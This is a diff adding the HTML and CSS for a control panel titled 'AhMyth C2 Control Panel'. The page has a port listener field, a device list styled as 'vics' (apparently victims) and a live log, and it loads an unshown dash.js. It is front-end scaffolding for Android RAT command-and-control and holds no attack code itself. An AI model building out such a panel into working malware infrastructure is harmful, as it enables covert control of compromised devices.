@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AhMyth C2 Control Panel</title>
+<link rel="stylesheet" href="style.css">
+<style>
+  .listen { display: flex; gap: 8px; align-items: center; }
+  .listen input { width: 90px; text-align: center; }
+  main { display: grid; grid-template-columns: 360px 1fr; gap: 16px; height: calc(100vh - 90px); }
+  @media (max-width: 800px) { main { grid-template-columns: 1fr; } }
+  .vics { overflow-y: auto; }
+  .vic { padding: 10px 12px; border: 1px solid var(--border); border-radius: 8px;
+         margin-bottom: 8px; background: var(--panel); }
+  .vic .top { display: flex; justify-content: space-between; align-items: center; gap: 8px; }
+  .vic .model { font-weight: 600; }
+  .vic .meta { color: var(--dim); font-size: 11px; margin-top: 3px; }
+  .vic .act { color: var(--dim); font-size: 11px; margin-top: 6px; }
+  #log { height: 100%; overflow-y: auto; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+         font-size: 12px; }
+  #log div { padding: 2px 4px; border-bottom: 1px solid #11161d; }
+  #log .in { color: var(--accent); } #log .out { color: var(--ok); }
+  #log .err { color: var(--danger); } #log .dim { color: var(--dim); }
+</style>
+</head>
+<body>
+<header>
+  <h1>AhMyth <span class="acc">C2</span> Control Panel</h1>
+  <span class="status"><span class="dot" id="dot"></span><span id="sttext">not listening</span></span>
+  <span class="spacer"></span>
+  <div class="listen">
+    <span class="dim" style="font-size:12px">port</span>
+    <input type="number" id="port" value="42474" min="1" max="65535">
+    <button id="listen" class="primary">Listen</button>
+  </div>
+</header>
+<main>
+  <div>
+    <div class="card vics" style="height:100%">
+      <h2>Devices &mdash; click to open lab</h2>
+      <div id="vics"><p class="empty">press <b>Listen</b> to start the server…</p></div>
+    </div>
+  </div>
+  <div class="card" style="height:100%">
+    <h2>Live log &middot; <span class="dim" id="logcount">0</span></h2>
+    <div id="log"></div>
+  </div>
+</main>
+<script src="dash.js"></script>
+</body>
+</html>
